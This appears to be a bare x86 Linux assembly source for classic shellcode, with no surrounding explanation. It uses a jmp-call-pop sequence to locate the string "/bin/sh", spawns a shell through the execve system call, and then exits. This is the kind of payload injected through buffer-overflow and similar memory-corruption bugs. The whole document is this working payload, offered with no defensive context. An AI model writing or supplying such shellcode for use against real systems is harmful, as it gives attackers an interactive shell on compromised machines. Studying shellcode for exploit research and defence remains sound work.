.text

.globl _start

_start:
	jmp _binsh
_init:
	popl %ebx
	xorl %eax, %eax
	xorl %ecx, %ecx
	xorl %edx, %edx
	movb $0xb, %al
	int $0x80
	
	xorl %eax, %eax
	xorl %ebx, %ebx
	movb $0x1, %al
	int $0x80
_binsh:
	call _init
	.ascii "/bin/sh"
